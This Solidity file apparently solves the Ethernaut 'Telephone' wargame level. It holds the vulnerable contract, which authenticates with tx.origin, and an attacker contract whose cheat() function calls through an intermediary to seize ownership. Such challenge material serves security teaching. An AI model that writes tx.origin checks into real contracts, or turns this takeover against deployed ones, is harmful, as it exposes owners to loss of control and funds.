pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract ChangeOwner{
    
    
    Telephone _tel;
    
    function ChangeOwner(){
        _tel = Telephone("<instance contract address>");
    }
    
    function cheat(){
        _tel.changeOwner(msg.sender);
    }
}